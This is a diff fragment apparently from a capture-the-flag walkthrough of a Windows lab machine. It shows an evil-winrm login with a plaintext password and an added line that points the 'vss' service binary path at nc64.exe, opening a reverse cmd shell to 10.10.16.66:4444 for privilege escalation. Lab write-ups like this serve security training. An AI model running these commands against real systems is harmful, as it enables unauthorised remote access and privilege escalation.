@@ -26,7 +26,7 @@ evil-winrm -i 10.129.95.241 -u svc-printer -p 1edFg43012!!
 ```
 
 ```
-
+sc.exe config vss binPath="C:\Users\svc-printer\Desktop\nc64.exe -e cmd.exe 10.10.16.66 4444"
 ```
 
 ```
